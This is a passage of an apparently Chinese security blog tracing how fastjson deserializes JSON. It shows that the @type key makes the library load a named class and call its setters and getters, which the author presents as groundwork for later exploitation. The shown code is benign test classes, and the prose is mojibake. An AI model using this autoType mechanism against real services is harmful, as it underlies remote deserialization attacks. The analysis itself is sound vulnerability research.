<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="s">&#34;{\&#34;user_age\&#34;:1233,\&#34;user_name\&#34;:\&#34;fupanc\&#34;}&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>ç®€å•è°ƒè¯•ç†è§£ä¸€ä¸‹ï¼Œå¯ä»¥çŸ¥é“è¿™é‡Œå¤§æ¦‚å°±æ˜¯ä¸€ä¸ªå°†Stringç±»å‹çš„jsonå­—ç¬¦ä¸²ç»™è§£ææˆä¸€ä¸ªJSONObjectå¯¹è±¡ï¼Œå¯¹è±¡å­˜åœ¨å¦‚ä¸‹å†…å®¹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409170705211.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409170705211"
	
	
></p>
<p>é‚£ä¹ˆä½†æ˜¯è¿™æ ·å°±ä¸èƒ½å°†å…¶è§£æä¸ºä¸€ä¸ªå¯¹è±¡äº†ï¼Œå’Œæˆ‘ä»¬ä¹‹å‰åˆ†æçš„æœ‰å¾ˆå¤§åŒºåˆ«ï¼Œè¿™é‡Œå°±éœ€è¦åˆ©ç”¨åˆ°<code>@type</code>è¿™ä¸ªå±æ€§äº†ï¼Œå¦‚ä¸‹æµ‹è¯•ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.annotation.JSONField</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSONObject</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">string</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">&#34;{\&#34;@type\&#34;:\&#34;fastjson.Person\&#34;,\&#34;user_age\&#34;:1233,\&#34;user_name\&#34;:\&#34;fupanc\&#34;}&#34;</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">JSONObject</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">string</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_name&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_age&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>å…¶å®ä¸»è¦å°±æ˜¯å‰é¢éƒ¨åˆ†æœ‰ç‚¹åŒºåˆ«ï¼Œåé¢éƒ¨åˆ†å’Œå‰é¢è°ƒè¯•åˆ†æçš„ååºåˆ—åŒ–è¿‡ç¨‹å°±å¾ˆæƒ³åƒäº†ï¼Œæˆ‘ä»¬è¿˜æ˜¯æ‰“æ–­ç‚¹äºparseObject()æ–¹æ³•ï¼Œç„¶åä¼šè°ƒç”¨parse()æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409174420111.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409174420111"
	
	
></p>
<p>æŒç»­è·Ÿè¿›é‡è½½çš„parse()æ–¹æ³•ï¼Œå¦‚ä¸‹çš„ä»£ç å¤„ç†æ˜¯æœ€å…³é”®çš„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409174521689.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409174521689"
	
	
></p>
<p>ä¼šè°ƒç”¨DefaultJSONParserç±»çš„parse()æ–¹æ³•ï¼Œç„¶åå°±ç»™å‡ºå…³é”®éƒ¨åˆ†å§ï¼Œè¿‡ç¨‹æ¶‰åŠåˆ°çš„ç±»æ¯”è¾ƒå¤šï¼Œè¿˜æ˜¯ç»™ä¸€ä¸ªè°ƒç”¨æ ˆå°±è¡Œäº†ï¼Œè‡ªå·±è°ƒè¯•ä¸€ä¸‹è¿‡ç¨‹å³å¯ï¼Œåˆ°å¦‚ä¸‹å…³é”®ä»£ç å¤„ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409174849532.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409174849532"
	
	
></p>
<p>è¿™é‡Œä¼šè°ƒç”¨TypeUtilsç±»çš„loadClass()æ–¹æ³•ï¼Œæ³¨æ„ä¸€ä¸‹è¿™é‡Œæ¡ä»¶çš„æ»¡è¶³ï¼Œéœ€è¦keyä¸º<code>@type</code>ç­‰ï¼Œå¹¶ä¸”è¿™é‡Œå®é™…æ˜¯è°ƒç”¨ç±»åŠ è½½å™¨æ¥åŠ è½½Personç±»ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409175041098.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409175041098"
	
	
></p>
<p>è°ƒç”¨æ ˆå¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span><span class="lnt">8
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">loadClass</span><span class="p">:</span><span class="mi">1032</span><span class="p">,</span> <span class="n">TypeUtils</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">util</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parseObject</span><span class="p">:</span><span class="mi">322</span><span class="p">,</span> <span class="n">DefaultJSONParser</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parse</span><span class="p">:</span><span class="mi">1327</span><span class="p">,</span> <span class="n">DefaultJSONParser</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parse</span><span class="p">:</span><span class="mi">1293</span><span class="p">,</span> <span class="n">DefaultJSONParser</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="o">.</span><span class="n">parser</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parse</span><span class="p">:</span><span class="mi">137</span><span class="p">,</span> <span class="n">JSON</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parse</span><span class="p">:</span><span class="mi">128</span><span class="p">,</span> <span class="n">JSON</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">parseObject</span><span class="p">:</span><span class="mi">201</span><span class="p">,</span> <span class="n">JSON</span> <span class="p">(</span><span class="n">com</span><span class="o">.</span><span class="n">alibaba</span><span class="o">.</span><span class="n">fastjson</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">main</span><span class="p">:</span><span class="mi">10</span><span class="p">,</span> <span class="n">Fastjson_Test</span> <span class="p">(</span><span class="n">fastjson</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>åœ¨è¿”å›äº†è¿™ä¸ªClasså¯¹è±¡åï¼Œç„¶ååˆè·Ÿè¿›ï¼Œåˆ°å¦‚ä¸‹ä»£ç ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409175133681.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409175133681"
	
	
></p>
<p>è¿™é‡Œä¸å°±æ˜¯å‰é¢ååºåˆ—åŒ–æ—¶çš„ä»£ç å—ï¼Œæ‰€ä»¥æ˜¯å¯ä»¥è°ƒç”¨åˆ°setteræ–¹æ³•çš„ï¼Œå°±ä¸åˆ†æäº†ï¼Œå¯ä»¥æˆåŠŸè·å–åˆ°Personç±»å®ä¾‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409175412810.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409175412810"
	
	
></p>
<p>æ‰€ä»¥æœ€åè¿˜æ˜¯è¿”å›çš„è¿™ä¸ªPersonç±»å¯¹è±¡ï¼Œåªæ˜¯å°†å…¶è½¬æ¢æˆäº†JSONå¯¹è±¡ï¼š
<img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173223899.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409173223899"
	
	
></p>
<p>è€Œåœ¨è¿™ä¸ªtoJSONæ–¹æ³•ä¸­ï¼Œåˆå­˜åœ¨å‰é¢åˆ†æçš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè·Ÿè¿›è¿™ä¸ªtoJSON()æ–¹æ³•ï¼Œåœ¨åç»­é‡è½½çš„toJSON()æ–¹æ³•ä¸­ï¼Œè°ƒç”¨åˆ°äº†å¦‚ä¸‹æ–¹æ³•ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173618827.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409173618827"
	
	
></p>
<p>ä¸€ç›´å¾€åé¢è·Ÿå¯ä»¥çŸ¥é“å°±æ˜¯å‰é¢çš„åºåˆ—åŒ–è¿‡ç¨‹ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œæœ€åè·å–åˆ°çš„å¯¹è±¡å¦‚ä¸‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173813303.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409173813303"
	
	
></p>
<p>ç»§ç»­å¾€åé¢çœ‹ï¼š</p>
<p><img src="https://fpc-mybucket.oss-cn-beijing.aliyuncs.com/images/image-20250409173954687.png"
	
	
	
	loading="lazy"
	
		alt="image-20250409173954687"
	
	
></p>
<p>è¿™é‡Œçš„getFieldValuesMap()æ–¹æ³•å°±æ˜¯è°ƒç”¨getteræ¥è·å–å€¼ï¼Œç„¶åä»¥é”®å€¼å¯¹å½¢å¼æ”¾å…¥JSONObjectä¸­ï¼Œæœ€åè¿”å›äº†JSONObjectå®ä¾‹ï¼Œä¹Ÿå°±æ˜¯æœ€åè°ƒç”¨parseObject()è·å–åˆ°çš„ä¸œè¥¿ã€‚</p>
<p>ä»ä¸Šé¢çš„æ•´ä¸ªè¿‡ç¨‹æ¥çœ‹ï¼Œå³è°ƒç”¨äº†setterï¼Œè¿˜è°ƒç”¨äº†getterï¼Œåé¢ä»å‡ ä¸ªç‰ˆæœ¬æ¥æ¥çœ‹çœ‹è¿™é‡Œçš„åˆ©ç”¨ç‚¹ã€‚</p>
<p><strong>è¿™é‡Œè¿˜æœ‰ä¸ªç‚¹ä¸å¾—ä¸è¯´æ˜</strong>ï¼šfastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º <code>byte[]</code>ï¼Œå°†ä¼šè°ƒç”¨<code>com.alibaba.fastjson.parser.JSONScanner#bytesValue</code> è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚å…·ä½“ä½“ç°å°±åœ¨åé¢çš„ä¾‹å­ä¸­è¯´æ˜ã€‚</p>
<p>è¿˜æœ‰äº›å…¶ä»–è¦æ±‚ï¼Œè¿™é‡Œå°±ä¸å¤šè¯´äº†ï¼Œçœ‹åé¢çš„è°ƒç”¨é“¾ï¼Œå¹¶ä¸”å…¶å®åœ¨å‰é¢çš„ä»£ç è°ƒè¯•åˆ†æä¸­éƒ½æ˜¯æœ‰ä½“ç°çš„ï¼Œåªæ˜¯æ²¡ç»†è¯´ã€‚</p>
<h3 id="è¡¥å……è¯´æ˜">è¡¥å……è¯´æ˜
</h3><p>ä¸»è¦æ˜¯è¡¥å……å‰é¢é—æ¼çš„ä¸€ä¸ªç»†èŠ‚ï¼Œåœ¨å‰é¢çš„åˆ†æä¸­ï¼Œä¹Ÿæ˜¯æåˆ°äº†ä¸€ä¸ªç‚¹ï¼Œåœ¨ååºåˆ—åŒ–çš„æ—¶å€™ï¼Œé™¤äº†ä¼šè°ƒç”¨setterï¼Œè¿˜ä¼šå¤„ç†getterï¼Œåœ¨ä¸€å®šæƒ…å†µä¸‹ï¼Œ<strong>è¿™ä¸ªçš„getteråˆ©ç”¨æ˜¯éå¸¸å…³é”®ä¸”é‡è¦çš„</strong>ï¼Œæˆ‘ä»¬è¿˜æ˜¯ä»¥ä¸Šé¢ååºåˆ—åŒ–çš„ä»£ç è¿›è¡Œæµ‹è¯•ï¼Œåˆ†æå‡ ä¸ªå¿…è¦çš„æ¡ä»¶ï¼Œç„¶åå†ç»™å‡ºä¸€ä¸ªä¾‹å­æ¥è¿›è¡Œè¯æ˜ï¼Œåˆ†æä»£ç è¿˜æ˜¯å¦‚ä¸‹ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kn">package</span><span class="w"> </span><span class="nn">fastjson</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.JSON</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">com.alibaba.fastjson.annotation.JSONField</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Fastjson_Test</span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Person</span><span class="p">();</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setName</span><span class="p">(</span><span class="s">&#34;fupanc&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">person</span><span class="p">.</span><span class="na">setAge</span><span class="p">(</span><span class="n">1233</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//åºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====åºåˆ—åŒ–=====&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">String</span><span class="w"> </span><span class="n">json</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">toJSONString</span><span class="p">(</span><span class="n">person</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">json</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="c1">//ååºåˆ—åŒ–</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;=====ååºåˆ—åŒ–=====&#34;</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Person</span><span class="w"> </span><span class="n">person1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">JSON</span><span class="p">.</span><span class="na">parseObject</span><span class="p">(</span><span class="n">json</span><span class="p">,</span><span class="n">Person</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getName</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="n">person1</span><span class="p">.</span><span class="na">getAge</span><span class="p">());</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">class</span> <span class="nc">Person</span><span class="w">  </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_name&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@JSONField</span><span class="p">(</span><span class="n">name</span><span class="o">=</span><span class="s">&#34;user_age&#34;</span><span class="p">)</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">Person</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="c1">// Getters and Setters</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="nf">getName</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setName</span><span class="p">(</span><span class="n">String</span><span class="w"> </span><span class="n">name</span><span class="p">){</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">name</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">int</span><span class="w"> </span><span class="nf">getAge</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">age</span><span class="p">;</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">
</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setAge</span><span class="p">(</span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="p">){</span><span class="w">
